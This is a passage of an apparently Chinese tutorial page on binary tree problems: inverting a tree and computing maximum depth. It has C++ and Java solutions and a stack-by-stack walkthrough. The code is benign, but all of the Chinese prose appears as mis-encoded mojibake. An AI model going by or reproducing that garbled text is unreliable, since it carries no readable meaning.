class="keyword">if</span> (node-&gt;left) st.<span class="built_in">push</span>(node-&gt;left);    <span class="comment">// å·¦</span></span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                node = st.<span class="built_in">top</span>();</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="built_in">swap</span>(node-&gt;left, node-&gt;right);          <span class="comment">// èŠ‚ç‚¹å¤„ç†é€»è¾‘</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å‡è®¾æˆ‘ä»¬æœ‰å¦‚ä¸‹äºŒå‰æ ‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><p>è¿™æ£µæ ‘çš„ç›®æ ‡æ˜¯è¦ç¿»è½¬æ¯ä¸ªèŠ‚ç‚¹çš„å·¦å³å­æ ‘ã€‚ç¿»è½¬ååº”è¯¥å˜æˆï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">3   2</span><br><span class="line">   / \</span><br><span class="line">  5   4</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æŒ‰ç…§ä»£ç çš„æ‰§è¡Œé€»è¾‘ä¸€æ­¥ä¸€æ­¥åœ°å±•ç¤ºæ ˆçš„å˜åŒ–è¿‡ç¨‹ã€‚</p><h3 id="åˆå§‹çŠ¶æ€"><a href="#åˆå§‹çŠ¶æ€" class="headerlink" title="åˆå§‹çŠ¶æ€"></a>åˆå§‹çŠ¶æ€</h3><ul><li>æ ˆåˆå§‹åŒ–å¹¶å°†æ ¹èŠ‚ç‚¹ <code>1</code> å‹å…¥æ ˆä¸­ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [1]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸€æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-1"><a href="#ç¬¬ä¸€æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-1" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 1"></a>ç¬¬ä¸€æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 1</h3><ul><li>å¼¹å‡ºèŠ‚ç‚¹ <code>1</code>ï¼Œå› ä¸ºå®ƒä¸ä¸ºç©ºï¼ŒæŒ‰ç…§å³-ä¸­-å·¦é¡ºåºè¿›è¡Œå‹æ ˆã€‚<ul><li>å°† <code>1</code> çš„å³å­èŠ‚ç‚¹ <code>3</code> å‹å…¥æ ˆã€‚</li><li>å°†èŠ‚ç‚¹ <code>1</code> æœ¬èº«å‹å…¥æ ˆã€‚</li><li>å‹å…¥ <code>NULL</code> æ ‡è®°ã€‚</li><li>å°† <code>1</code> çš„å·¦å­èŠ‚ç‚¹ <code>2</code> å‹å…¥æ ˆã€‚</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 2]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥ï¼šå¤„ç†èŠ‚ç‚¹-2"><a href="#ç¬¬äºŒæ­¥ï¼šå¤„ç†èŠ‚ç‚¹-2" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 2"></a>ç¬¬äºŒæ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 2</h3><ul><li>å¼¹å‡ºèŠ‚ç‚¹ <code>2</code>ï¼Œå› ä¸ºå®ƒä¸ä¸ºç©ºï¼ŒæŒ‰ç…§å³-ä¸­-å·¦é¡ºåºè¿›è¡Œå‹æ ˆã€‚<ul><li>å°† <code>2</code> çš„å³å­èŠ‚ç‚¹ <code>5</code> å‹å…¥æ ˆã€‚</li><li>å°†èŠ‚ç‚¹ <code>2</code> æœ¬èº«å‹å…¥æ ˆã€‚</li><li>å‹å…¥ <code>NULL</code> æ ‡è®°ã€‚</li><li>å°† <code>2</code> çš„å·¦å­èŠ‚ç‚¹ <code>4</code> å‹å…¥æ ˆã€‚</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, 2, NULL, 4]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸‰æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-4"><a href="#ç¬¬ä¸‰æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-4" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 4"></a>ç¬¬ä¸‰æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 4</h3><ul><li>å¼¹å‡ºèŠ‚ç‚¹ <code>4</code>ï¼Œå®ƒæ²¡æœ‰å­èŠ‚ç‚¹ã€‚<ul><li>å°†èŠ‚ç‚¹ <code>4</code> æœ¬èº«å‹å…¥æ ˆã€‚</li><li>å‹å…¥ <code>NULL</code> æ ‡è®°ã€‚</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, 2, NULL, 4, NULL]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å››æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-4ï¼‰"><a href="#ç¬¬å››æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-4ï¼‰" class="headerlink" title="ç¬¬å››æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 4ï¼‰"></a>ç¬¬å››æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 4ï¼‰</h3><ul><li>é‡åˆ° <code>NULL</code> æ ‡è®°ï¼Œå¼¹å‡º <code>NULL</code> å¹¶è·å–èŠ‚ç‚¹ <code>4</code>ã€‚</li><li>å¯¹ <code>4</code> è¿›è¡Œç¿»è½¬ï¼Œä½† <code>4</code> æ²¡æœ‰å­èŠ‚ç‚¹ï¼Œç»“æ„ä¿æŒä¸å˜ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, 2, NULL]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬äº”æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-5"><a href="#ç¬¬äº”æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-5" class="headerlink" title="ç¬¬äº”æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 5"></a>ç¬¬äº”æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 5</h3><ul><li>å¼¹å‡ºèŠ‚ç‚¹ <code>5</code>ï¼Œå®ƒæ²¡æœ‰å­èŠ‚ç‚¹ã€‚<ul><li>å°†èŠ‚ç‚¹ <code>5</code> æœ¬èº«å‹å…¥æ ˆã€‚</li><li>å‹å…¥ <code>NULL</code> æ ‡è®°ã€‚</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL, 5, NULL]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å…­æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-5ï¼‰"><a href="#ç¬¬å…­æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-5ï¼‰" class="headerlink" title="ç¬¬å…­æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 5ï¼‰"></a>ç¬¬å…­æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 5ï¼‰</h3><ul><li>é‡åˆ° <code>NULL</code> æ ‡è®°ï¼Œå¼¹å‡º <code>NULL</code> å¹¶è·å–èŠ‚ç‚¹ <code>5</code>ã€‚</li><li>å¯¹ <code>5</code> è¿›è¡Œç¿»è½¬ï¼Œä½† <code>5</code> æ²¡æœ‰å­èŠ‚ç‚¹ï¼Œç»“æ„ä¿æŒä¸å˜ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, 1, NULL]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¸ƒæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-2ï¼‰"><a href="#ç¬¬ä¸ƒæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-2ï¼‰" class="headerlink" title="ç¬¬ä¸ƒæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 2ï¼‰"></a>ç¬¬ä¸ƒæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 2ï¼‰</h3><ul><li>é‡åˆ° <code>NULL</code> æ ‡è®°ï¼Œå¼¹å‡º <code>NULL</code> å¹¶è·å–èŠ‚ç‚¹ <code>2</code>ã€‚</li><li>å¯¹ <code>2</code> è¿›è¡Œç¿»è½¬ï¼Œä½¿å¾— <code>5</code> æˆä¸ºå·¦å­èŠ‚ç‚¹ï¼Œ<code>4</code> æˆä¸ºå³å­èŠ‚ç‚¹ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬å…«æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-3"><a href="#ç¬¬å…«æ­¥ï¼šå¤„ç†èŠ‚ç‚¹-3" class="headerlink" title="ç¬¬å…«æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 3"></a>ç¬¬å…«æ­¥ï¼šå¤„ç†èŠ‚ç‚¹ 3</h3><ul><li>å¼¹å‡ºèŠ‚ç‚¹ <code>3</code>ï¼Œå®ƒæ²¡æœ‰å­èŠ‚ç‚¹ã€‚<ul><li>å°†èŠ‚ç‚¹ <code>3</code> æœ¬èº«å‹å…¥æ ˆã€‚</li><li>å‹å…¥ <code>NULL</code> æ ‡è®°ã€‚</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: [3, NULL]</span><br></pre></td></tr></table></figure><h3 id="ç¬¬ä¹æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-3ï¼‰"><a href="#ç¬¬ä¹æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-3ï¼‰" class="headerlink" title="ç¬¬ä¹æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 3ï¼‰"></a>ç¬¬ä¹æ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 3ï¼‰</h3><ul><li>é‡åˆ° <code>NULL</code> æ ‡è®°ï¼Œå¼¹å‡º <code>NULL</code> å¹¶è·å–èŠ‚ç‚¹ <code>3</code>ã€‚</li><li>å¯¹ <code>3</code> è¿›è¡Œç¿»è½¬ï¼Œä½† <code>3</code> æ²¡æœ‰å­èŠ‚ç‚¹ï¼Œç»“æ„ä¿æŒä¸å˜ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Stack: []</span><br></pre></td></tr></table></figure><h3 id="ç¬¬åæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-1ï¼‰"><a href="#ç¬¬åæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹-1ï¼‰" class="headerlink" title="ç¬¬åæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 1ï¼‰"></a>ç¬¬åæ­¥ï¼šå¤„ç†ç©ºæ ‡è®°ï¼ˆå¤„ç†èŠ‚ç‚¹ 1ï¼‰</h3><ul><li>é‡åˆ° <code>NULL</code> æ ‡è®°ï¼Œå¼¹å‡º <code>NULL</code> å¹¶è·å–èŠ‚ç‚¹ <code>1</code>ã€‚</li><li>å¯¹ <code>1</code> è¿›è¡Œç¿»è½¬ï¼Œä½¿å¾— <code>3</code> æˆä¸ºå·¦å­èŠ‚ç‚¹ï¼Œ<code>2</code> æˆä¸ºå³å­èŠ‚ç‚¹ã€‚</li></ul><h3 id="æœ€ç»ˆç»“æ„"><a href="#æœ€ç»ˆç»“æ„" class="headerlink" title="æœ€ç»ˆç»“æ„"></a>æœ€ç»ˆç»“æ„</h3><p>ç°åœ¨æ ‘å·²å®Œå…¨ç¿»è½¬ï¼Œå¾—åˆ°çš„æ ‘ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  1</span><br><span class="line"> / \</span><br><span class="line">3   2</span><br><span class="line">   / \</span><br><span class="line">  5   4</span><br></pre></td></tr></table></figure><p>è¿™æ ·é€šè¿‡ä¸€æ­¥æ­¥åœ°æ ˆæ“ä½œï¼Œæˆ‘ä»¬æˆåŠŸåœ°ç¿»è½¬äº†è¿™æ£µäºŒå‰æ ‘ã€‚æ¯æ¬¡é‡åˆ° <code>NULL</code> æ ‡è®°æ—¶ï¼Œæ ˆé¡¶çš„èŠ‚ç‚¹éƒ½å¯ä»¥å®‰å…¨åœ°è¿›è¡Œå·¦å³å­èŠ‚ç‚¹çš„äº¤æ¢ï¼Œç›´åˆ°æ ˆä¸ºç©ºã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// DFSé€’å½’</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        invertTree(root.left);</span><br><span class="line">        invertTree(root.right);</span><br><span class="line">        swapChildren(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swapChildren</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// BFS</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">invertTree</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ArrayDeque&lt;TreeNode&gt; deque = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        deque.offer(root);</span><br><span class="line">        <span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">            <span class="keyword">while</span>(size-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> deque.poll();</span><br><span class="line">                swap(node);</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) deque.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) deque.offer(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swap</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">tmp</span> <span class="operator">=</span> root.left;</span><br><span class="line">        root.left = root.right;</span><br><span class="line">        root.right = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="104-äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦-1"><a href="#104-äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦-1" class="headerlink" title="104.äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦"></a>104.äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦</h2><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ‰¾å‡ºå…¶æœ€å¤§æ·±åº¦ã€‚<br>äºŒå‰æ ‘çš„æ·±åº¦ä¸ºæ ¹èŠ‚ç‚¹åˆ°æœ€è¿œå¶å­èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ä¸Šçš„èŠ‚ç‚¹æ•°ã€‚<br>è¯´æ˜: å¶å­èŠ‚ç‚¹æ˜¯æŒ‡æ²¡æœ‰å­èŠ‚ç‚¹çš„èŠ‚ç‚¹ã€‚</p><p>åœ¨äºŒå‰æ ‘çš„éå†ä¸­ï¼Œ<strong>å‰åºéå†</strong>å’Œ<strong>ååºéå†</strong>æœ‰ä¸åŒçš„åº”ç”¨åœºæ™¯ï¼Œç‰¹åˆ«æ˜¯åœ¨è®¡ç®—æ ‘çš„<strong>æ·±åº¦</strong>å’Œ<strong>é«˜åº¦</strong>æ—¶ï¼š</p><h3 id="æ‹“å±•"><a href="#æ‹“å±•" class="headerlink" title="æ‹“å±•"></a>æ‹“å±•</h3><h3 id="1-æ·±åº¦ï¼ˆDepthï¼‰ä¸å‰åºéå†"><a href="#1-æ·±åº¦ï¼ˆDepthï¼‰ä¸å‰åºéå†" class="headerlink" title="1. æ·±åº¦ï¼ˆDepthï¼‰ä¸å‰åºéå†"></a>1. <strong>æ·±åº¦ï¼ˆDepthï¼‰ä¸å‰åºéå†</strong></h3><ul><li><strong>å‰åºéå†ï¼ˆä¸­å·¦å³ï¼‰</strong>çš„é¡ºåºæ„å‘³ç€æˆ‘ä»¬ä»æ ¹èŠ‚ç‚¹å¼€å§‹é€å±‚æ·±å…¥ï¼Œè¿™ä¸æ·±åº¦çš„å®šä¹‰ç›¸å¥‘åˆã€‚</li><li>åœ¨é€’å½’å®ç°ä¸­ï¼Œæˆ‘ä»¬åœ¨æ¯ä¸ªèŠ‚ç‚¹é€’å½’è¿›å…¥å…¶å­èŠ‚ç‚¹æ—¶ï¼Œéƒ½å¯ä»¥ç´¯è®¡å½“å‰çš„æ·±åº¦å€¼ã€‚</li><li>å› æ­¤ï¼Œå‰åºéå†å¸¸ç”¨äºè®¡ç®—<strong>æ·±åº¦</strong>ï¼Œå³ä»æ ¹èŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹çš„æœ€é•¿è·¯å¾„ã€‚</li><li>ä¾‹å¦‚ï¼Œåœ¨éå†ä¸­ä¸æ–­å‘ä¸‹é€’å½’æ—¶ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¡ç®—å¹¶æ›´æ–°æ ‘çš„<strong>æœ€å¤§æ·±åº¦</strong>æˆ–æ˜¯æ‰¾åˆ°äºŒå‰æ ‘çš„<strong>æœ€å°æ·±åº¦</strong>ã€‚</li></ul><h3 id="2-é«˜åº¦ï¼ˆHeightï¼‰ä¸ååºéå†"><a href="#2-é«˜åº¦ï¼ˆHeightï¼‰ä¸ååºéå†" class="headerlink" title="2. é«˜åº¦ï¼ˆHeightï¼‰ä¸ååºéå†"></a>2. <strong>é«˜åº¦ï¼ˆHeightï¼‰ä¸ååºéå†</strong></h3><ul><li><strong>ååºéå†ï¼ˆå·¦å³ä¸­ï¼‰</strong>çš„é¡ºåºåˆ™æ˜¯ä»å­èŠ‚ç‚¹å›æº¯åˆ°çˆ¶èŠ‚ç‚¹ã€‚</li><li>åœ¨è®¡ç®—é«˜åº¦æ—¶ï¼Œè¿™ç§éå†é¡ºåºæœ€ä¸ºåˆç†ï¼Œå› ä¸ºæ ‘çš„<strong>é«˜åº¦</strong>å®šä¹‰ä¸ºâ€œèŠ‚ç‚¹åˆ°å¶èŠ‚ç‚¹æœ€é•¿è·¯å¾„çš„é•¿åº¦â€ï¼Œè€Œè¦è®¡ç®—é«˜åº¦ï¼Œå°±éœ€è¦å…ˆçŸ¥é“å­èŠ‚ç‚¹çš„é«˜åº¦ï¼Œç„¶åå–å·¦å³å­æ ‘çš„æœ€å¤§é«˜åº¦ï¼Œå†åŠ  1ã€‚</li><li>ä¾‹å¦‚ï¼Œå½“é€’å½’è¿”å›åˆ°çˆ¶èŠ‚ç‚¹æ—¶ï¼Œå¯ä»¥åˆ©ç”¨å·¦å³å­æ ‘çš„é«˜åº¦æ¥è®¡ç®—å½“å‰èŠ‚ç‚¹çš„é«˜åº¦ã€‚å› æ­¤ï¼Œååºéå†å¯ä»¥å¾ˆå¥½åœ°ç”¨äºè®¡ç®—<strong>æ ‘çš„é«˜åº¦</strong>ã€‚</li></ul><h3 id="ç®€å•ç¤ºä¾‹"><a href="#ç®€å•ç¤ºä¾‹" class="headerlink" title="ç®€å•ç¤ºä¾‹"></a>ç®€å•ç¤ºä¾‹</h3><p>å‡è®¾æˆ‘ä»¬æœ‰è¿™æ ·ä¸€æ£µäºŒå‰æ ‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> / \</span><br><span class="line">4   5</span><br></pre></td></tr></table></figure><h4 id="ç”¨å‰åºéå†è®¡ç®—æ·±åº¦"><a href="#ç”¨å‰åºéå†è®¡ç®—æ·±åº¦" class="headerlink" title="ç”¨å‰åºéå†è®¡ç®—æ·±åº¦"></a>ç”¨å‰åºéå†è®¡ç®—æ·±åº¦</h4><ul><li>æˆ‘ä»¬ä»æ ¹èŠ‚ç‚¹ <code>1</code> å‡ºå‘ï¼Œé€æ­¥é€’å½’åˆ°æ¯ä¸€å±‚çš„å¶èŠ‚ç‚¹ï¼Œåœ¨æ¯æ¬¡è¿›å…¥ä¸‹ä¸€å±‚æ—¶æ›´æ–°å½“å‰æ·±åº¦ã€‚</li><li>æ¯”å¦‚è¿™æ£µæ ‘çš„æœ€å¤§æ·±åº¦æ˜¯ <code>3</code>ï¼ˆä»æ ¹èŠ‚ç‚¹ <code>1</code> åˆ°å¶èŠ‚ç‚¹ <code>4</code> æˆ– <code>5</code>ï¼‰ã€‚</li></ul><h4 id="ç”¨ååºéå†è®¡ç®—é«˜åº¦"><a href="#ç”¨ååºéå†è®¡ç®—é«˜åº¦" class="headerlink" title="ç”¨ååºéå†è®¡ç®—é«˜åº¦"></a>ç”¨ååºéå†è®¡ç®—é«˜åº¦</h4><ul><li>åœ¨ååºéå†ä¸­ï¼Œé¦–å…ˆé€’å½’åˆ°å¶èŠ‚ç‚¹ <code>4</code> å’Œ <code>5</code>ï¼Œç„¶åå›æº¯åˆ°èŠ‚ç‚¹ <code>2</code>ï¼Œå¯ä»¥è®¡ç®—å‡º <code>4</code> å’Œ <code>5</code> çš„é«˜åº¦ï¼Œç„¶åå¾—å‡ºèŠ‚ç‚¹ <code>2</code> çš„é«˜åº¦ï¼Œå†å›æº¯åˆ°æ ¹èŠ‚ç‚¹ã€‚</li><li>æœ€ç»ˆæ ‘çš„é«˜åº¦ä¹Ÿæ˜¯ <code>3</code>ï¼Œå› ä¸ºä»å¶èŠ‚ç‚¹ <code>4</code> æˆ– <code>5</code> åˆ°æ ¹èŠ‚ç‚¹ <code>1</code> çš„æœ€é•¿è·¯å¾„é•¿åº¦ä¸º <code>3</code>ã€‚</li></ul><p>æ ¹èŠ‚ç‚¹çš„é«˜åº¦å°±æ˜¯äºŒå‰æ ‘çš„æœ€å¤§æ·±åº¦ï¼Œæ‰€ä»¥æœ¬é¢˜ä¸­æˆ‘ä»¬é€šè¿‡ååºæ±‚çš„æ ¹èŠ‚ç‚¹é«˜åº¦æ¥æ±‚çš„äºŒå‰æ ‘æœ€å¤§æ·±åº¦ã€‚</p><h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>ä½¿ç”¨è¿­ä»£æ³•çš„è¯ï¼Œä½¿ç”¨å±‚åºéå†æ˜¯æœ€ä¸ºåˆé€‚çš„ï¼Œå› ä¸ºæœ€å¤§çš„æ·±åº¦å°±æ˜¯äºŒå‰æ ‘çš„å±‚æ•°ï¼Œå’Œå±‚åºéå†çš„æ–¹å¼æå…¶å»åˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxDepth</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        Queue&lt;TreeNode&gt; que = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">        que.offer(root);</span><br><span class="line">        <span class="type">int</span> <span class="variable">depth</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(!que.isEmpty())&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> que.size();</span><br><span class="line">            <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> que.poll();</span><br><span class="line">                <span class="keyword">if</span>(node.left != <span class="literal">null</span>) que.offer(node.left);</span><br><span class="line">                <span class="keyword">if</span>(node.right != <span class="literal">null</span>) que.offer(node.right);</span><br><span class="line">                len--;</span><br><span class="line">            &#125;</span><br><span class="line">            depth++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> depth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨é€’å½’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 